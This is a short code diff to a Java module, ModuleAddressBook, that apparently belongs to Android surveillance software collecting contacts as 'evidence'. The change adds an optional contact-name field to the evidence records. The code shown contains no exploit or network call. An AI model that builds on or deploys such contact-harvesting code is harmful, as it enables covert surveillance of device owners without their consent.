@@ -44,8 +44,6 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 	public static final int VIBER = 0x0b;
 	public static final int LOCAL = 0x80000000;
 
-
-
 	private PickContact contact;
 	Markup markupContacts;
 	static HashMap<Long, Long> contacts; // (contact.id, contact.pack.crc)
@@ -372,8 +370,12 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 
 		return 0;
 	}
-
+	
 	public static void createEvidenceLocal(int evId, String data) {
+		createEvidenceLocal(evId, data, null);
+	}
+
+	public static void createEvidenceLocal(int evId, String data, String name) {
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (createEvidenceLocal) id: " + evId + " data: " + data);//$NON-NLS-1$
@@ -386,6 +388,9 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 		}
 
 		addTypedString(outputStream, (byte) 0x40, data);
+		if (name != null) {
+			addTypedString(outputStream, (byte) 0x01, name);
+		}
 
 		byte[] payload = outputStream.toByteArray();
 		final int size = outputStream.size();
